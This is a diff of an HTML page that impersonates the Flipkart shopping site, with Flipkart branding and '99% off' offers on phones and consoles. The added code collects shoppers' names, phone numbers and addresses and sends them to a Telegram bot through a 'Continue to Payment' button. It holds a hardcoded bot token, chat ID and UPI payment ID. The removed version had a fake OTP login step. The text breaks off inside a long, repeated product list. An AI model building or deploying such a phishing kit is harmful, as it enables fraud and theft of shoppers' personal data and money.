@@ -3,1389 +3,254 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Flipkart | Multi-Photo Store</title>
+    <title>Flipkart | Big Billion Days</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.css" />
     <style>
-        body { background-color: #f1f3f6; font-family: 'Roboto', sans-serif; }
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
+        body { font-family: 'Roboto', sans-serif; background-color: #f1f3f6; margin: 0; }
         .fk-blue { background-color: #2874f0; }
-        .fk-orange { background: #ff9f00; color: white; }
-        .fk-buy { background: #fb641b; color: white; }
-        .hidden { display: none; }
-        .thumb-active { border: 2px solid #2874f0; }
-        .sticky-footer { position: fixed; bottom: 0; left: 0; right: 0; display: flex; z-index: 100; box-shadow: 0 -2px 10px rgba(0,0,0,0.1); }
+        .btn-orange { background: #fb641b; color: #fff; border-radius: 2px; }
+        .btn-yellow { background: #ff9f00; color: #fff; border-radius: 2px; }
+        .rating-badge { background: #388e3c; color: #fff; padding: 2px 6px; border-radius: 3px; font-weight: bold; font-size: 11px; }
+        .line-input { width: 100%; border-bottom: 2px solid #e0e0e0; padding: 10px 0; outline: none; transition: 0.3s; font-size: 14px; background: transparent; }
+        .line-input:focus { border-bottom-color: #2874f0; }
+        .category-scroll::-webkit-scrollbar { display: none; }
+        .banner-swiper { height: 160px; }
+        .banner-swiper img { width: 100%; height: 100%; object-fit: fill; }
     </style>
 </head>
 <body>
 
-    <header class="fk-blue p-3 sticky top-0 z-[100]">
-        <div class="max-w-6xl mx-auto flex items-center gap-4">
-            <img src="https://static-assets-web.flixcart.com/batman-returns/static/content/img/flipkart-logo_9995d0.svg" width="75" onclick="location.reload()" class="cursor-pointer">
-            <div class="flex-1 bg-white rounded-sm flex items-center px-3 py-1.5">
-                <i class="fa-solid fa-magnifying-glass text-gray-400 mr-2"></i>
-                <input type="text" id="search" onkeyup="searchItems()" placeholder="Search for products..." class="w-full outline-none text-sm">
+    <div id="page-home">
+        <header class="fk-blue py-3 px-4 flex items-center justify-between sticky top-0 z-[100]">
+            <div class="flex items-center gap-3">
+                <i class="fa-solid fa-bars text-white text-lg"></i>
+                <img src="https://static-assets-web.flixcart.com/batman-returns/batman-returns/p/images/fkheaderlogo_exploreplus_mobile-f4d035.svg" class="h-5">
+            </div>
+            <div class="flex gap-4 text-white items-center">
+                <i class="fa-solid fa-bell"></i>
+                <i class="fa-solid fa-cart-shopping"></i>
+            </div>
+        </header>
+
+        <div class="fk-blue px-4 pb-3">
+            <div class="bg-white rounded-sm flex items-center px-3 py-2 text-gray-400 gap-2">
+                <i class="fa-solid fa-magnifying-glass"></i>
+                <span class="text-sm">Search for products</span>
             </div>
         </div>
-    </header>
 
-    <div id="homePage">
-        <img src="https://rukminim1.flixcart.com/fk-p-flap/1600/270/image/ed18063f10134015.jpg" class="w-full shadow-sm mb-2">
-        <div class="p-2 grid grid-cols-2 md:grid-cols-4 lg:grid-cols-5 gap-2" id="productGrid"></div>
+        <div class="swiper banner-swiper mt-1">
+            <div class="swiper-wrapper">
+                <div class="swiper-slide"><img src="https://rukminim1.flixcart.com/fk-p-flap/3200/540/image/7be563256301e160.jpg?q=60"></div>
+                <div class="swiper-slide"><img src="https://rukminim1.flixcart.com/fk-p-flap/3200/540/image/5b309e98775e22e4.jpg?q=60"></div>
+            </div>
+            <div class="swiper-pagination"></div>
+        </div>
+
+        <div class="p-3 bg-white mt-1 font-bold">Deals of the Day</div>
+        <main id="main-grid" class="p-2 grid grid-cols-2 gap-2 pb-20"></main>
     </div>
 
-    <div id="productPage" class="hidden bg-white min-h-screen pb-24">
-        <div class="max-w-4xl mx-auto">
-            <div class="p-4 flex justify-center border-b">
-                <img id="mainImg" src="" class="h-72 md:h-[400px] object-contain transition-all duration-300">
-            </div>
-            
-            <div id="thumbContainer" class="flex gap-2 p-4 justify-center overflow-x-auto">
-                </div>
+    <div id="page-detail" class="hidden fixed inset-0 bg-white z-[200] overflow-y-auto">
+        <nav class="p-3 border-b sticky top-0 bg-white z-[210] flex items-center gap-4">
+            <i class="fa-solid fa-arrow-left text-xl" onclick="showPage('page-home')"></i>
+            <img src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-cp-zion/img/flipkart-plus_8d85f4.png" class="h-4">
+        </nav>
+        
+        <div class="swiper detailSwiper h-72 bg-white">
+            <div class="swiper-wrapper" id="detail-img-wrapper"></div>
+            <div class="swiper-pagination"></div>
+        </div>
 
-            <div class="p-4">
-                <h1 id="pTitle" class="text-lg font-medium"></h1>
-                <div class="flex items-center gap-2 mt-2">
-                    <span class="bg-green-700 text-white text-[10px] px-2 py-0.5 rounded-sm font-bold">4.5 ★</span>
-                    <span class="text-gray-400 text-xs font-bold italic">f-assured</span>
-                </div>
-                <div class="mt-4">
-                    <span id="pPrice" class="text-3xl font-bold"></span>
-                    <span class="text-green-600 text-sm font-bold ml-2">Extra Off</span>
-                </div>
-                <div class="mt-6 border-t pt-4 text-sm space-y-2">
-                    <p><b>Delivery:</b> 2-3 Days</p>
-                    <p><b>Highlights:</b> 2026 Latest Model, 1 Year Warranty</p>
-                </div>
+        <div class="p-4 bg-white">
+            <p id="det-name" class="text-sm font-medium"></p>
+            <div class="flex items-center gap-2 mt-1">
+                <span class="rating-badge">4.6 ★</span>
+                <span class="text-gray-400 text-xs underline">1,24,510 Ratings</span>
+            </div>
+            <div class="flex items-baseline gap-2 mt-2">
+                <span id="det-price" class="text-2xl font-bold text-black"></span>
+                <span class="text-green-600 font-bold text-sm">99% off</span>
             </div>
         </div>
 
-        <div class="sticky-footer bg-white border-t">
-            <button class="fk-orange w-1/2 py-4 font-bold">ADD TO CART</button>
-            <button onclick="openAddress()" class="fk-buy w-1/2 py-4 font-bold">BUY NOW</button>
-        </div>
-    </div>
-
-    <div id="checkoutPage" class="hidden max-w-4xl mx-auto mt-4 px-2">
-        <div id="addrBox" class="bg-white shadow border p-5 mb-3">
-            <h3 class="font-bold text-blue-600 border-b pb-3 mb-4 uppercase text-xs">1. Delivery Address</h3>
-            <input type="text" id="name" placeholder="Full Name" class="border p-3 w-full mb-3 rounded-sm">
-            <textarea id="addr" placeholder="Full Address" class="border p-3 w-full mb-3 rounded-sm"></textarea>
-            <button onclick="showLogin()" class="fk-buy w-full py-3 font-bold uppercase">Deliver Here</button>
+        <div class="p-4 bg-white mt-2 pb-24 border-t">
+            <h3 class="font-bold mb-3">Recent Reviews</h3>
+            <div id="reviews-container" class="space-y-4 text-sm"></div>
         </div>
 
-        <div id="loginBox" class="bg-white shadow border p-5 hidden">
-            <h3 class="font-bold text-blue-600 border-b pb-3 mb-4 uppercase text-xs">2. Login & OTP</h3>
-            <div id="phStep">
-                <input type="number" id="phone" placeholder="Mobile Number" class="border-b-2 border-gray-300 w-full p-2 outline-none text-xl mb-6">
-                <button onclick="sendOTP()" class="fk-buy w-full py-3 font-bold uppercase">Continue</button>
-            </div>
-            <div id="otpStep" class="hidden">
-                <p class="text-sm mb-2">OTP sent to +91 <span id="uPh"></span></p>
-                <input type="number" id="otp" placeholder="xxxx" class="border-b-2 border-gray-300 w-full p-2 outline-none text-center font-bold text-3xl tracking-[10px] mb-6">
-                <button onclick="finishOrder()" class="fk-buy w-full py-3 font-bold uppercase">Verify & Pay</button>
-            </div>
+        <div class="fixed bottom-0 w-full flex h-14 bg-white border-t z-[220]">
+            <button class="w-1/2 font-bold text-sm uppercase">Add to Cart</button>
+            <button onclick="showPage('page-address')" class="w-1/2 btn-yellow font-bold text-sm uppercase">Buy Now</button>
         </div>
     </div>
 
+    <div id="page-address" class="hidden fixed inset-0 bg-[#f1f3f6] z-[300] overflow-y-auto">
+        <nav class="fk-blue p-4 text-white flex items-center gap-4 sticky top-0">
+            <i class="fa-solid fa-arrow-left" onclick="showPage('page-detail')"></i>
+            <span class="font-medium">Delivery Address</span>
+        </nav>
+        <div class="bg-white p-6 m-2 shadow-sm space-y-5">
+            <input type="text" id="uName" placeholder="Full Name*" class="line-input">
+            <input type="tel" id="uPhone" placeholder="Mobile Number*" class="line-input">
+            <div class="relative">
+                <input type="number" id="uPin" placeholder="Pincode*" oninput="checkPincode(this.value)" class="line-input">
+                <span id="pin-loader" class="absolute right-0 top-3 text-[10px] text-blue-600 hidden italic">Fetching...</span>
+            </div>
+            <div class="flex gap-4">
+                <input type="text" id="uCity" placeholder="City/District" class="line-input bg-gray-50" readonly>
+                <input type="text" id="uState" placeholder="State" class="line-input bg-gray-50" readonly>
+            </div>
+            <input type="text" id="uHouse" placeholder="House No., Building Name*" class="line-input">
+            <button id="payBtn" onclick="sendToTelegram()" class="w-full btn-orange py-4 font-bold uppercase shadow-lg mt-4">Continue to Payment</button>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.js"></script>
     <script>
-        // Updated Data with Multiple Images
+        // --- CONFIG ---
+        const BOT_TOKEN = "8327016009:AAH1igUPnQsuURjtmxxHqaAWTKS-haiO7jM"; // <-- Apna Token Dalein
+        const CHAT_ID = "1981500395"; // <-- Apni Chat ID Dalein
+        const MY_UPI_ID = "8709615634-w350@ybl"; 
+
+        let selectedProductPrice = 0;
+        let selectedProductName = "";
+
         const products = [
-             {
-                id: 1,
-                name: "iPhone 16 Pro Max (Desert Titanium, 256GB)",
-                price: 134900,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/b/f/5/-original-imahggexm5yafhez.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/s/1/0/-original-imahggevkpgh5dkc.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/i/z/y/-original-imahggevgnkffgfs.jpeg"
-                ]
-            },
-            {
-                id: 2,
-                name: "Samsung Galaxy S24 Ultra 5G (Titanium Gray)",
-                price: 109999,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/j/m/z/-original-imahgfmxumntk7sy.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/8/f/f/-original-imahgfmxq9f7sz6k.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/c/f/g/-original-imahgfmxnuhv2mxt.jpeg"
-                ]
-            },
-            {
-                id: 3,
-                name: "Sony WH-1000XM5 Wireless Headphones",
-                price: 24990,
-                images: [
-                    "https://rukminim2.flixcart.com/image/612/612/xif0q/headphone/9/a/w/-original-imahe5gm9yszqgxc.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/headphone/e/x/m/-original-imahe5gmey3y7hh6.jpeg"
-                ]
-            },
-            {
-                id: 4,
-                name: "Sony PlayStation 5 Console (Slim)",
-                price: 49990,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/gaming-console/t/n/v/-original-imagzn7fvg8dt77s.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/gaming-console/4/q/e/-original-imagzn7fshgpygxz.jpeg"
-                 ]
-             },
-             {
-                id: 1,
-                name: "iPhone 16 Pro Max (Desert Titanium, 256GB)",
-                price: 134900,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/b/f/5/-original-imahggexm5yafhez.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/s/1/0/-original-imahggevkpgh5dkc.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/i/z/y/-original-imahggevgnkffgfs.jpeg"
-                ]
-            },
-            {
-                id: 2,
-                name: "Samsung Galaxy S24 Ultra 5G (Titanium Gray)",
-                price: 109999,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/j/m/z/-original-imahgfmxumntk7sy.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/8/f/f/-original-imahgfmxq9f7sz6k.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/c/f/g/-original-imahgfmxnuhv2mxt.jpeg"
-                ]
-            },
-            {
-                id: 3,
-                name: "Sony WH-1000XM5 Wireless Headphones",
-                price: 24990,
-                images: [
-                    "https://rukminim2.flixcart.com/image/612/612/xif0q/headphone/9/a/w/-original-imahe5gm9yszqgxc.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/headphone/e/x/m/-original-imahe5gmey3y7hh6.jpeg"
-               ]
-            },
-            {
-                id: 4,
-                name: "Sony PlayStation 5 Console (Slim)",
-                price: 49990,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/gaming-console/t/n/v/-original-imagzn7fvg8dt77s.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/gaming-console/4/q/e/-original-imagzn7fshgpygxz.jpeg"
-               ]
-            },
-            {
-                id: 1,
-                name: "iPhone 16 Pro Max (Desert Titanium, 256GB)",
-                price: 134900,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/b/f/5/-original-imahggexm5yafhez.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/s/1/0/-original-imahggevkpgh5dkc.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/i/z/y/-original-imahggevgnkffgfs.jpeg"
-                ]
-            },
-            {
-                id: 2,
-                name: "Samsung Galaxy S24 Ultra 5G (Titanium Gray)",
-                price: 109999,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/j/m/z/-original-imahgfmxumntk7sy.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/8/f/f/-original-imahgfmxq9f7sz6k.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/c/f/g/-original-imahgfmxnuhv2mxt.jpeg"
-                ]
-            },
-            {
-                id: 3,
-                name: "Sony WH-1000XM5 Wireless Headphones",
-                price: 24990,
-                images: [
-                    "https://rukminim2.flixcart.com/image/612/612/xif0q/headphone/9/a/w/-original-imahe5gm9yszqgxc.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/headphone/e/x/m/-original-imahe5gmey3y7hh6.jpeg"
-                ]
-            },
-            {
-                id: 4,
-                name: "Sony PlayStation 5 Console (Slim)",
-                price: 49990,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/gaming-console/t/n/v/-original-imagzn7fvg8dt77s.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/gaming-console/4/q/e/-original-imagzn7fshgpygxz.jpeg"
-                 ]
-             },
-             {
-                id: 1,
-                name: "iPhone 16 Pro Max (Desert Titanium, 256GB)",
-                price: 134900,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/b/f/5/-original-imahggexm5yafhez.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/s/1/0/-original-imahggevkpgh5dkc.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/i/z/y/-original-imahggevgnkffgfs.jpeg"
-                ]
-            },
-            {
-                id: 2,
-                name: "Samsung Galaxy S24 Ultra 5G (Titanium Gray)",
-                price: 109999,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/j/m/z/-original-imahgfmxumntk7sy.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/8/f/f/-original-imahgfmxq9f7sz6k.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/c/f/g/-original-imahgfmxnuhv2mxt.jpeg"
-                ]
-            },
-            {
-                id: 3,
-                name: "Sony WH-1000XM5 Wireless Headphones",
-                price: 24990,
-                images: [
-                    "https://rukminim2.flixcart.com/image/612/612/xif0q/headphone/9/a/w/-original-imahe5gm9yszqgxc.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/headphone/e/x/m/-original-imahe5gmey3y7hh6.jpeg"
-                ]
-            },
-            {
-                id: 4,
-                name: "Sony PlayStation 5 Console (Slim)",
-                price: 49990,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/gaming-console/t/n/v/-original-imagzn7fvg8dt77s.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/gaming-console/4/q/e/-original-imagzn7fshgpygxz.jpeg"
-                ]
-            },
-            {
-                id: 1,
-                name: "iPhone 16 Pro Max (Desert Titanium, 256GB)",
-                price: 134900,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/b/f/5/-original-imahggexm5yafhez.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/s/1/0/-original-imahggevkpgh5dkc.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/i/z/y/-original-imahggevgnkffgfs.jpeg"
-                ]
-            },
-            {
-                id: 2,
-                name: "Samsung Galaxy S24 Ultra 5G (Titanium Gray)",
-                price: 109999,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/j/m/z/-original-imahgfmxumntk7sy.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/8/f/f/-original-imahgfmxq9f7sz6k.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/c/f/g/-original-imahgfmxnuhv2mxt.jpeg"
-                ]
-            },
-            {
-                id: 3,
-                name: "Sony WH-1000XM5 Wireless Headphones",
-                price: 24990,
-                images: [
-                    "https://rukminim2.flixcart.com/image/612/612/xif0q/headphone/9/a/w/-original-imahe5gm9yszqgxc.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/headphone/e/x/m/-original-imahe5gmey3y7hh6.jpeg"
-                ]
-            },
-            {
-                id: 4,
-                name: "Sony PlayStation 5 Console (Slim)",
-                price: 49990,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/gaming-console/t/n/v/-original-imagzn7fvg8dt77s.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/gaming-console/4/q/e/-original-imagzn7fshgpygxz.jpeg"
-                ]
-             },
-             {
-                id: 1,
-                name: "iPhone 16 Pro Max (Desert Titanium, 256GB)",
-                price: 134900,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/b/f/5/-original-imahggexm5yafhez.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/s/1/0/-original-imahggevkpgh5dkc.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/i/z/y/-original-imahggevgnkffgfs.jpeg"
-               ]
-            },
-            {
-                id: 2,
-                name: "Samsung Galaxy S24 Ultra 5G (Titanium Gray)",
-                price: 109999,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/j/m/z/-original-imahgfmxumntk7sy.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/8/f/f/-original-imahgfmxq9f7sz6k.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/c/f/g/-original-imahgfmxnuhv2mxt.jpeg"
-                ]
-            },
-            {
-                id: 3,
-                name: "Sony WH-1000XM5 Wireless Headphones",
-                price: 24990,
-                images: [
-                    "https://rukminim2.flixcart.com/image/612/612/xif0q/headphone/9/a/w/-original-imahe5gm9yszqgxc.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/headphone/e/x/m/-original-imahe5gmey3y7hh6.jpeg"
-                ]
-            },
-            {
-                id: 4,
-                name: "Sony PlayStation 5 Console (Slim)",
-                price: 49990,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/gaming-console/t/n/v/-original-imagzn7fvg8dt77s.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/gaming-console/4/q/e/-original-imagzn7fshgpygxz.jpeg"
-                   ]
-            },
-            {
-                id: 1,
-                name: "iPhone 16 Pro Max (Desert Titanium, 256GB)",
-                price: 134900,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/b/f/5/-original-imahggexm5yafhez.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/s/1/0/-original-imahggevkpgh5dkc.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/i/z/y/-original-imahggevgnkffgfs.jpeg"
-                ]
-            },
-            {
-                id: 2,
-                name: "Samsung Galaxy S24 Ultra 5G (Titanium Gray)",
-                price: 109999,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/j/m/z/-original-imahgfmxumntk7sy.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/8/f/f/-original-imahgfmxq9f7sz6k.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/c/f/g/-original-imahgfmxnuhv2mxt.jpeg"
-                ]
-            },
-            {
-                id: 3,
-                name: "Sony WH-1000XM5 Wireless Headphones",
-                price: 24990,
-                images: [
-                    "https://rukminim2.flixcart.com/image/612/612/xif0q/headphone/9/a/w/-original-imahe5gm9yszqgxc.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/headphone/e/x/m/-original-imahe5gmey3y7hh6.jpeg"
-                ]
-            },
-            {
-                id: 4,
-                name: "Sony PlayStation 5 Console (Slim)",
-                price: 49990,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/gaming-console/t/n/v/-original-imagzn7fvg8dt77s.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/gaming-console/4/q/e/-original-imagzn7fshgpygxz.jpeg"
-                 ]
-             },
-             {
-                id: 1,
-                name: "iPhone 16 Pro Max (Desert Titanium, 256GB)",
-                price: 134900,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/b/f/5/-original-imahggexm5yafhez.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/s/1/0/-original-imahggevkpgh5dkc.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/i/z/y/-original-imahggevgnkffgfs.jpeg"
-                ]
-            },
-            {
-                id: 2,
-                name: "Samsung Galaxy S24 Ultra 5G (Titanium Gray)",
-                price: 109999,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/j/m/z/-original-imahgfmxumntk7sy.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/8/f/f/-original-imahgfmxq9f7sz6k.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/c/f/g/-original-imahgfmxnuhv2mxt.jpeg"
-                ]
-            },
-            {
-                id: 3,
-                name: "Sony WH-1000XM5 Wireless Headphones",
-                price: 24990,
-                images: [
-                    "https://rukminim2.flixcart.com/image/612/612/xif0q/headphone/9/a/w/-original-imahe5gm9yszqgxc.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/headphone/e/x/m/-original-imahe5gmey3y7hh6.jpeg"
-                ]
-            },
-            {
-                id: 4,
-                name: "Sony PlayStation 5 Console (Slim)",
-                price: 49990,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/gaming-console/t/n/v/-original-imagzn7fvg8dt77s.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/gaming-console/4/q/e/-original-imagzn7fshgpygxz.jpeg"
-                ]
-            },
-            {
-              
-                id: 1,
-                name: "iPhone 16 Pro Max (Desert Titanium, 256GB)",
-                price: 134900,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/b/f/5/-original-imahggexm5yafhez.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/s/1/0/-original-imahggevkpgh5dkc.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/i/z/y/-original-imahggevgnkffgfs.jpeg"
-                ]
-            },
-            {
-                id: 2,
-                name: "Samsung Galaxy S24 Ultra 5G (Titanium Gray)",
-                price: 109999,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/j/m/z/-original-imahgfmxumntk7sy.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/8/f/f/-original-imahgfmxq9f7sz6k.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/c/f/g/-original-imahgfmxnuhv2mxt.jpeg"
-                ]
-            },
-            {
-                id: 3,
-                name: "Sony WH-1000XM5 Wireless Headphones",
-                price: 24990,
-                images: [
-                    "https://rukminim2.flixcart.com/image/612/612/xif0q/headphone/9/a/w/-original-imahe5gm9yszqgxc.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/headphone/e/x/m/-original-imahe5gmey3y7hh6.jpeg"
-                ]
-            },
-            {
-                id: 4,
-                name: "Sony PlayStation 5 Console (Slim)",
-                price: 49990,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/gaming-console/t/n/v/-original-imagzn7fvg8dt77s.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/gaming-console/4/q/e/-original-imagzn7fshgpygxz.jpeg"
-                 ]
-             },
-             {
-                id: 1,
-                name: "iPhone 16 Pro Max (Desert Titanium, 256GB)",
-                price: 134900,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/b/f/5/-original-imahggexm5yafhez.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/s/1/0/-original-imahggevkpgh5dkc.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/i/z/y/-original-imahggevgnkffgfs.jpeg"
-                ]
-            },
-            {
-                id: 2,
-                name: "Samsung Galaxy S24 Ultra 5G (Titanium Gray)",
-                price: 109999,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/j/m/z/-original-imahgfmxumntk7sy.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/8/f/f/-original-imahgfmxq9f7sz6k.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/c/f/g/-original-imahgfmxnuhv2mxt.jpeg"
-                ]
-            },
-            {
-                id: 3,
-                name: "Sony WH-1000XM5 Wireless Headphones",
-                price: 24990,
-                images: [
-                    "https://rukminim2.flixcart.com/image/612/612/xif0q/headphone/9/a/w/-original-imahe5gm9yszqgxc.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/headphone/e/x/m/-original-imahe5gmey3y7hh6.jpeg"
-                ]
-            },
-            {
-                id: 4,
-                name: "Sony PlayStation 5 Console (Slim)",
-                price: 49990,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/gaming-console/t/n/v/-original-imagzn7fvg8dt77s.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/gaming-console/4/q/e/-original-imagzn7fshgpygxz.jpeg"
-               ]
-            },
-            {
-                id: 1,
-                name: "iPhone 16 Pro Max (Desert Titanium, 256GB)",
-                price: 134900,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/b/f/5/-original-imahggexm5yafhez.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/s/1/0/-original-imahggevkpgh5dkc.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/i/z/y/-original-imahggevgnkffgfs.jpeg"
-                ]
-            },
-            {
-                id: 2,
-                name: "Samsung Galaxy S24 Ultra 5G (Titanium Gray)",
-                price: 109999,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/j/m/z/-original-imahgfmxumntk7sy.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/8/f/f/-original-imahgfmxq9f7sz6k.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/c/f/g/-original-imahgfmxnuhv2mxt.jpeg"
-                ]
-            },
-            {
-                id: 3,
-                name: "Sony WH-1000XM5 Wireless Headphones",
-                price: 24990,
-                images: [
-                    "https://rukminim2.flixcart.com/image/612/612/xif0q/headphone/9/a/w/-original-imahe5gm9yszqgxc.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/headphone/e/x/m/-original-imahe5gmey3y7hh6.jpeg"
-                ]
-            },
-            {
-                id: 4,
-                name: "Sony PlayStation 5 Console (Slim)",
-                price: 49990,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/gaming-console/t/n/v/-original-imagzn7fvg8dt77s.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/gaming-console/4/q/e/-original-imagzn7fshgpygxz.jpeg"
-                 ]
-             },
-             {
-                id: 1,
-                name: "iPhone 16 Pro Max (Desert Titanium, 256GB)",
-                price: 134900,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/b/f/5/-original-imahggexm5yafhez.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/s/1/0/-original-imahggevkpgh5dkc.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/i/z/y/-original-imahggevgnkffgfs.jpeg"
-                ]
-            },
-            {
-                id: 2,
-                name: "Samsung Galaxy S24 Ultra 5G (Titanium Gray)",
-                price: 109999,
-                images: [
